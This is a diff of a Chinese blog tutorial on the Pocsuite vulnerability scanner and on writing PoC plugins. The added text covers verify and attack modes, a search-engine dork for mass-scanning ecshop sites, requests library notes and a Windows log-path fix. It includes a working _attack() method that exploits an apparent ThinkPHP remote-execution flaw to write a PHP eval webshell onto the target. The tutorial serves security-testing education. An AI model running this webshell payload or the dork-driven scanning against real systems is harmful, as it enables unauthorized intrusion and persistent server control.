@@ -13,7 +13,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title> 小透的少年江湖</title>
+      <title>Pocsuite使用及Poc编写 |  小透的少年江湖</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/haoyun.ico" />
@@ -66,17 +66,31 @@
   data-scroll-reveal
 >
   <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Pocsuite使用及Poc编写
+</h1>
+ 
+
+      
+    </header>
      
     <div class="article-meta">
       <a href="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/" class="article-date">
-  <time datetime="2022-02-07T06:30:41.166Z" itemprop="datePublished">2022-02-07</time>
-</a>   
+  <time datetime="2022-02-07T01:56:28.000Z" itemprop="datePublished">2022-02-07</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%86%85%E5%8A%9F%E5%BF%83%E6%B3%95/">内功心法</a> / <a class="article-category-link" href="/categories/%E5%86%85%E5%8A%9F%E5%BF%83%E6%B3%95/Poc%E7%BC%96%E5%86%99/">Poc编写</a>
+  </div>
+  
 <div class="word_count">
     <span class="post-time">
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">2.5k</span>
+            <span class="post-count">3.5k</span>
         </span>
     </span>
 
@@ -85,7 +99,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">12 分钟</span>
+            <span class="post-count">16 分钟</span>
         </span>
     </span>
 </div>
@@ -109,9 +123,25 @@
 
 <h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><p>Pocsuite的使用可以通过两种方式进行，一种是直接在输入命令时指定poc文件和线程数量进行探测，另外一种是设置pocsuite.ini文件命令行默认运行。</p>
 <h3 id="指定文件探测"><a href="#指定文件探测" class="headerlink" title="指定文件探测"></a>指定文件探测</h3><p>举例: 使用ZoomEye搜索ecshop并使用ecshop_rce.py探测，指定线程数量为5</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 cli.py --r pocs/ecshop_rce.py --dork ecshop  --threads 5</span><br><span class="line"></span><br><span class="line">#--r        指定需要使用的poc文件</span><br><span class="line">#--dork     指定搜索引擎搜索的内容(Zoomeye,shodan......)</span><br><span class="line">#--threads  指定线程数量</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python3 cli.py --r pocs/ecshop_rce.py --dork ecshop  --threads 5</span><br><span class="line"></span><br><span class="line">#--r            指定需要使用的poc文件</span><br><span class="line">#--dork         指定搜索引擎搜索的内容(Zoomeye,shodan......)</span><br><span class="line">#--max-page     ZoomEye API 的请求翻页数（10 目标/页）</span><br><span class="line">#--search-type  ZoomEye API搜索类型，web 或者 host</span><br><span class="line">#--vul-keyword  Seebug 搜索关键词，用于在Seebug 搜索漏洞POC</span><br><span class="line">#--threads      指定线程数量</span><br></pre></td></tr></table></figure>
 
 <img src="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/image-20220207150558967.png" class title="image-20220207150558967">
+
+
+
+<p><strong>verify模式</strong></p>
+<p>验证目标是否存在漏洞。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">单个目标验证：</span><br><span class="line">pocsuite -r tests/poc_example.py -u http://www.example.com/ --verify</span><br><span class="line"></span><br><span class="line">批量文件验证:</span><br><span class="line">pocsuite -r test/poc_example.py -f url.txt --verify</span><br><span class="line"></span><br><span class="line">扫描器（使用目录下的所有Poc对目标进行测试）:</span><br><span class="line">pocsuite -r tests/ -u http://www.example.com --verify</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><strong>attack模式</strong></p>
+<p>向存在漏洞的目标进行漏洞利用攻击。(用法和verify模式相同)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pocsuite -r tests/poc_example.py -u http://www.example.com/ --attack</span><br></pre></td></tr></table></figure>
+
+
 
 
 
@@ -165,7 +195,8 @@
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34640691/article/details/109119942">(58条消息) 关于pocsuite下的pocs代码分析_willow_liang的博客-CSDN博客</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45007073/article/details/113094045">(58条消息) POC和EXP脚本_平凡的学者的博客-CSDN博客_exp脚本</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44426869/article/details/103962994">(58条消息) 使用Pocsuite3框架并编写简单PoC例子_情感博主V-CSDN博客_pocsuite3使用</a></p>
-<h3 id="方法格式使用"><a href="#方法格式使用" class="headerlink" title="方法格式使用"></a>方法格式使用</h3><p>开头是对该Poc的简介，关于创建的时间、作者的名字，针对该Poc的漏洞信息和执行判断结果.</p>
+<h3 id="方法格式使用"><a href="#方法格式使用" class="headerlink" title="方法格式使用"></a>方法格式使用</h3><p>编写Poc主要分为Poc介绍信息模块，漏洞检测模块，漏洞利用模块，返回结果模块。</p>
+<p>开头是对该Poc的简介，关于创建的时间、作者的名字，针对该Poc的漏洞信息和执行判断结果。</p>
 <img src="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/image-20220207154854764.png" class title="image-20220207154854764">
 
 
@@ -185,18 +216,30 @@
 
 
 
+<p>当该poc为exp模块时，_verify()为固定写法。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def _verify(self):	#exp模块固定写法</span><br><span class="line">       output = Output(self)</span><br><span class="line">       result = &#123;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="def-attack-self"><a href="#def-attack-self" class="headerlink" title="def _attack(self)"></a>def _attack(self)</h4><p>该方法为攻击模式的方法，编写对该漏洞利用的代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">def _attack(self):</span><br><span class="line">       result = &#123;&#125;</span><br><span class="line">       filename = random_str(6) + &quot;.php&quot;</span><br><span class="line">       webshell = r&#x27;&#x27;&#x27;&lt;?php echo &quot;green day&quot;;@eval($_POST[&quot;pass&quot;]);?&gt;&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">       p = self._check(self.url)</span><br><span class="line">       if p:</span><br><span class="line">           data = p[1]</span><br><span class="line">           data[&quot;vars[1][]&quot;] = &quot;echo%20%27&#123;content&#125;%27%20&gt;%20&#123;filename&#125;&quot;.format(filename=filename,</span><br><span class="line">                                                                                content=quote(webshell))</span><br><span class="line">           data[&quot;vars[0]&quot;] = &quot;system&quot;</span><br><span class="line">           vulurl = self.url + p[0]</span><br><span class="line">           requests.post(vulurl, data=data)</span><br><span class="line">           r = requests.get(self.url + &quot;/&quot; + filename)</span><br><span class="line">           if r.status_code == 200 and &quot;green day&quot; in r.text:</span><br><span class="line">               result[&#x27;ShellInfo&#x27;] = &#123;&#125;</span><br><span class="line">               result[&#x27;ShellInfo&#x27;][&#x27;URL&#x27;] = self.url + &quot;/&quot; + filename</span><br><span class="line">               result[&#x27;ShellInfo&#x27;][&#x27;Content&#x27;] = webshell</span><br><span class="line">       if not result:</span><br><span class="line">           vulurl = self.url + r&quot;/index.php?s=index/\think\template\driver\file/write&amp;cacheFile=&#123;filename&#125;&amp;content=&#123;content&#125;&quot;</span><br><span class="line">           vulurl = vulurl.format(filename=filename, content=quote(webshell))</span><br><span class="line">           requests.get(vulurl)</span><br><span class="line">           r = requests.get(self.url + &quot;/&quot; + filename)</span><br><span class="line">           if r.status_code == 200 and &quot;green day&quot; in r.text:</span><br><span class="line">               result[&#x27;ShellInfo&#x27;] = &#123;&#125;</span><br><span class="line">               result[&#x27;ShellInfo&#x27;][&#x27;URL&#x27;] = self.url + &quot;/&quot; + filename</span><br><span class="line">               result[&#x27;ShellInfo&#x27;][&#x27;Content&#x27;] = webshell</span><br><span class="line"></span><br><span class="line">       return self.parse_output(result)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>若该poc没有攻击模式，该方法可返回_verify()方法或者不写该方法。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def _attack(self):			#注意:若该poc没有攻击模式，在_attack函数下，return self._verify(),不用再写_attack()</span><br><span class="line">return self._verify()</span><br></pre></td></tr></table></figure>
+
+
+
 <h4 id="def-parse-output-self-result"><a href="#def-parse-output-self-result" class="headerlink" title="def parse_output(self, result)"></a>def parse_output(self, result)</h4><p>使用Output()函数判断探测结果</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">def parse_output(self, result):</span><br><span class="line">    output = Output(self)</span><br><span class="line">    if result:</span><br><span class="line">        output.success(result)</span><br><span class="line">    else:</span><br><span class="line">        output.fail(&#x27;target is not vulnerable&#x27;)</span><br><span class="line">    return output</span><br><span class="line">register(DemoPOC)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">def parse_output(self, result):</span><br><span class="line">    output = Output(self)</span><br><span class="line">    if result:</span><br><span class="line">        output.success(result)</span><br><span class="line">    else:</span><br><span class="line">        output.fail(&#x27;target is not vulnerable&#x27;)</span><br><span class="line">    return output</span><br><span class="line">register_poc(DemoPOC)</span><br></pre></td></tr></table></figure>
 
 
 
 <p>上述POC中涉及到的Output类代码，通过isinstance()函数判断传入的result是否为字典类型。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">class Output(object):</span><br><span class="line">    def __init__(self, poc=None):</span><br><span class="line">        self.error_msg = tuple()</span><br><span class="line">        self.result = &#123;&#125;</span><br><span class="line">        self.status = OUTPUT_STATUS.FAILED</span><br><span class="line">        if poc:</span><br><span class="line">            self.url = poc.url</span><br><span class="line">            self.mode = poc.mode</span><br><span class="line">            self.vul_id = poc.vulID</span><br><span class="line">            self.name = poc.name</span><br><span class="line">            self.app_name = poc.appName</span><br><span class="line">            self.app_version = poc.appVersion</span><br><span class="line">            self.error_msg = poc.expt</span><br><span class="line">    def success(self, result):</span><br><span class="line">        assert isinstance(result, dict)</span><br><span class="line">        self.status = OUTPUT_STATUS.SUCCESS</span><br><span class="line">        self.result = result</span><br><span class="line"></span><br><span class="line">    def fail(self, error=&quot;&quot;):</span><br><span class="line">        assert isinstance(error, str)</span><br><span class="line">        self.status = OUTPUT_STATUS.FAILED</span><br><span class="line">        self.error_msg = (0, error)</span><br><span class="line"></span><br><span class="line">class OUTPUT_STATUS:</span><br><span class="line">    SUCCESS = 1</span><br><span class="line">    FAILED = 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-
-
-
-
+<p>在使用Pocsuite的时候，我们可以用<code>--verify</code>参数来调用<code>_verify</code>方法，用<code>--attack</code>参数来调用<code>_attack</code>方法。</p>
 <h3 id="库的使用"><a href="#库的使用" class="headerlink" title="库的使用"></a>库的使用</h3><p>Python库引用模块</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pocsuite.api.poc import register</span><br><span class="line">from pocsuite.api.poc import Output, POCBase</span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import hashlib</span><br><span class="line">import string</span><br><span class="line">from requests.auth import HTTPBasicAuth</span><br></pre></td></tr></table></figure>
 
@@ -214,12 +257,40 @@
 
 
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">url: 需要爬取的网站地址。</span><br><span class="line"></span><br><span class="line">params: 翻译过来就是参数， url中的额外参数，字典或者字节流格式，可选。</span><br><span class="line"></span><br><span class="line">**kwargs : 12个控制访问的参数</span><br><span class="line">params：字典或字节序列， 作为参数增加到url中,使用这个参数可以把一些键值对以?key1=value1&amp;key2=value2的模式增加到url中</span><br><span class="line">例如：kv = &#123;&#x27;key1&#x27;:&#x27; values&#x27;, &#x27;key2&#x27;: &#x27;values&#x27;&#125; </span><br><span class="line">r = requests.get(&#x27;http:www.python123.io/ws&#x27;, params=kw)</span><br><span class="line"></span><br><span class="line">data：字典，字节序或文件对象，重点作为向服务器提供或提交资源是提交，，作为request的内容，与params不同的是，data提交的数据并不放在url链接里， 而是放在url链接对应位置的地方作为数据来存储。，它也可以接受一个字符串对象。</span><br><span class="line"></span><br><span class="line">json：json格式的数据， json合适在相关的html，http相关的web开发中非常常见， 也是http最经常使用的数据格式， 他是作为内容部分可以向服务器提交。</span><br><span class="line">例如：kv = &#123;&#x27;key1&#x27;: &#x27;value1&#x27;&#125; </span><br><span class="line">r = requests.post(&#x27;http://python123.io/ws&#x27;, json=kv)</span><br><span class="line"></span><br><span class="line">headers：字典是http的相关语，对应了向某个url访问时所发起的http的头i字段， 可以用这个字段来定义http的访问的http头，可以用来模拟任何我们想模拟的浏览器来对url发起访问。</span><br><span class="line">例子： hd = &#123;&#x27;user-agent&#x27;: &#x27;Chrome/10&#x27;&#125; </span><br><span class="line">r = requests.post(&#x27;http://python123.io/ws&#x27;, headers=hd)</span><br><span class="line"></span><br><span class="line">cookies：字典或CookieJar，指的是从http中解析cookie</span><br><span class="line"></span><br><span class="line">auth：元组，用来支持http认证功能</span><br><span class="line"></span><br><span class="line">files：字典， 是用来向服务器传输文件时使用的字段。</span><br><span class="line">例子：fs = &#123;&#x27;files&#x27;: open(&#x27;data.txt&#x27;, &#x27;rb&#x27;)&#125; </span><br><span class="line">r = requests.post(&#x27;http://python123.io/ws&#x27;, files=fs)</span><br><span class="line"></span><br><span class="line">timeout: 用于设定超时时间， 单位为秒，当发起一个get请求时可以设置一个timeout时间， 如果在timeout时间内请求内容没有返回， 将产生一个timeout的异常。</span><br><span class="line"></span><br><span class="line">proxies：字典， 用来设置访问代理服务器。</span><br><span class="line"></span><br><span class="line">allow_redirects: 开关， 表示是否允许对url进行重定向， 默认为True。</span><br><span class="line"></span><br><span class="line">stream: 开关， 指是否对获取内容进行立即下载， 默认为True。</span><br><span class="line"></span><br><span class="line">verify：开关， 用于认证SSL证书， 默认为True。</span><br><span class="line"></span><br><span class="line">cert： 用于设置保存本地SSL证书路径</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">url: 需要爬取的网站地址。</span><br><span class="line"></span><br><span class="line">params: 翻译过来就是参数， url中的额外参数，字典或者字节流格式，可选。</span><br><span class="line"></span><br><span class="line">**kwargs : 12个控制访问的参数</span><br><span class="line">params：字典或字节序列， 作为参数增加到url中,使用这个参数可以把一些键值对以?key1=value1&amp;key2=value2的模式增加到url中</span><br><span class="line">例如：kv = &#123;&#x27;key1&#x27;:&#x27; values&#x27;, &#x27;key2&#x27;: &#x27;values&#x27;&#125; </span><br><span class="line">r = requests.get(&#x27;http:www.python123.io/ws&#x27;, params=kw)</span><br><span class="line"></span><br><span class="line">data：字典，字节序或文件对象，重点作为向服务器提供或提交资源是提交，，作为request的内容，与params不同的是，data提交的数据并不放在url链接里， 而是放在url链接对应位置的地方作为数据来存储。，它也可以接受一个字符串对象。(request.post()函数)</span><br><span class="line"></span><br><span class="line">json：json格式的数据， json合适在相关的html，http相关的web开发中非常常见， 也是http最经常使用的数据格式， 他是作为内容部分可以向服务器提交。</span><br><span class="line">例如：kv = &#123;&#x27;key1&#x27;: &#x27;value1&#x27;&#125; </span><br><span class="line">r = requests.post(&#x27;http://python123.io/ws&#x27;, json=kv)</span><br><span class="line"></span><br><span class="line">headers：字典是http的相关语，对应了向某个url访问时所发起的http的头i字段， 可以用这个字段来定义http的访问的http头，可以用来模拟任何我们想模拟的浏览器来对url发起访问。</span><br><span class="line">例子： hd = &#123;&#x27;user-agent&#x27;: &#x27;Chrome/10&#x27;&#125; </span><br><span class="line">r = requests.post(&#x27;http://python123.io/ws&#x27;, headers=hd)</span><br><span class="line"></span><br><span class="line">cookies：字典或CookieJar，指的是从http中解析cookie</span><br><span class="line"></span><br><span class="line">auth：元组，用来支持http认证功能</span><br><span class="line"></span><br><span class="line">files：字典， 是用来向服务器传输文件时使用的字段。</span><br><span class="line">例子：fs = &#123;&#x27;files&#x27;: open(&#x27;data.txt&#x27;, &#x27;rb&#x27;)&#125; </span><br><span class="line">r = requests.post(&#x27;http://python123.io/ws&#x27;, files=fs)</span><br><span class="line"></span><br><span class="line">timeout: 用于设定超时时间， 单位为秒，当发起一个get请求时可以设置一个timeout时间， 如果在timeout时间内请求内容没有返回， 将产生一个timeout的异常。</span><br><span class="line"></span><br><span class="line">proxies：字典， 用来设置访问代理服务器。</span><br><span class="line"></span><br><span class="line">allow_redirects: 开关， 表示是否允许对url进行重定向， 默认为True。</span><br><span class="line"></span><br><span class="line">stream: 开关， 指是否对获取内容进行立即下载， 默认为True。</span><br><span class="line"></span><br><span class="line">verify：开关， 用于认证SSL证书， 默认为True。</span><br><span class="line"></span><br><span class="line">cert： 用于设置保存本地SSL证书路径</span><br></pre></td></tr></table></figure>
 
 
 
 <p>其中response对象有以下属性：</p>
-<img src="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/image-20220207184854731.png" class title="image-20220207184854731"> 
+<img src="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/image-20220207184854731.png" class title="image-20220207184854731">
+
+
+
+<p><strong>requests库的异常</strong></p>
+<p>注意<code>requests</code>库有时会产生异常，比如网络连接错误、<code>http</code>错误异常、重定向异常、请求<code>url</code>超时异常等等。所以我们需要判断<code>r.status_codes</code>是否是200，在这里我们怎么样去捕捉异常呢？</p>
+<p>这里我们可以利用<code>r.raise_for_status()</code> 语句去捕捉异常，该语句在方法内部判断<code>r.status_code</code>是否等于200，如果不等于，则抛出异常。</p>
+<p>于是在这里我们有一个爬取网页的通用代码框架：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    r=requests.get(url,timeout=30)#请求超时时间为30秒</span><br><span class="line">    r.raise_for_status()#如果状态不是200，则引发异常</span><br><span class="line">    r.encoding=r.apparent_encoding #配置编码</span><br><span class="line">    return r.text</span><br><span class="line">except:</span><br><span class="line">    return &quot;产生异常&quot; </span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Windows下Pocsuite写日志URL带冒号报错"><a href="#Windows下Pocsuite写日志URL带冒号报错" class="headerlink" title="Windows下Pocsuite写日志URL带冒号报错"></a>Windows下Pocsuite写日志URL带冒号报错</h2><h3 id="报错描述"><a href="#报错描述" class="headerlink" title="报错描述"></a>报错描述</h3><p>Windows平台使用Pocsuite，当输入的url带有<code>:</code>的时会报错，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[WARNING] unable to create output directory </span><br><span class="line">         &#x27;C:\Users\Administrator\.pocsuite\output\127.0.0.1:8080&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="错误分析"><a href="#错误分析" class="headerlink" title="错误分析"></a>错误分析</h3><p>原来保存日志记录会选取<code>C:\Users\Administrator\.pocsuite\output\</code>拼接上url地址，而windows下文件名不允许含有<code>:</code>，所以才会报错。</p>
+<p>所以，不论URL是<code>http://</code>还是带有冒号都会报错，看来pocsuite这边在创建这个文件名的时候名没有检查文件名字是否还有特殊符号呀。</p>
+<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>手动改代码解决问题：反向追踪哪个文件做了创建文件夹的操作。</p>
+<p>经查找，发现该操作代码存在于<code>pocsuite\lib\controller\controller.py</code>文件。</p>
+<p>从131行代码开始，定义了一个<code>_setRecordFiles()</code>函数，该函数会创建文件夹。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def _setRecordFiles():</span><br><span class="line">    for (target, pocname, pocid, component, version, status, r_time, result) in kb.results:</span><br><span class="line">        if type(status) != str:</span><br><span class="line">            status = status[1]</span><br><span class="line">            target=target.replace(&quot;:&quot;,&quot;_&quot;) #这里添加了一行替换代码</span><br><span class="line">        outputPath = os.path.join(getUnicode(paths.POCSUITE_OUTPUT_PATH), normalizeUnicode(getUnicode(target)))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以发现<code>_setRecordFiles()</code>函数从<code>kb.results</code>这个数据实例里面取值。</p>
+<p>我们用<code>target=target.replace(&quot;:&quot;,&quot;_&quot;)</code>来将<code>:</code>替换成<code>&quot;_&quot;</code>，问题解决。</p>
+ 
       <!-- reward -->
       
       <div id="reword-out">
@@ -294,6 +365,8 @@
 </div>
 
 <div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pocsuite%E6%89%AB%E6%8F%8F%E5%99%A8-Poc%E7%BC%96%E5%86%99/" rel="tag">-Pocsuite扫描器 -Poc编写</a></li></ul>
+
     </footer>
   </div>
 
@@ -301,9 +374,9 @@
   <nav class="article-nav">
     
     
-      <a href="/2022/01/17/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" class="article-nav-link">
+      <a href="/2022/01/23/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title"></div>
+        <div class="article-nav-title">git用法小记</div>
       </a>
     
   </nav>
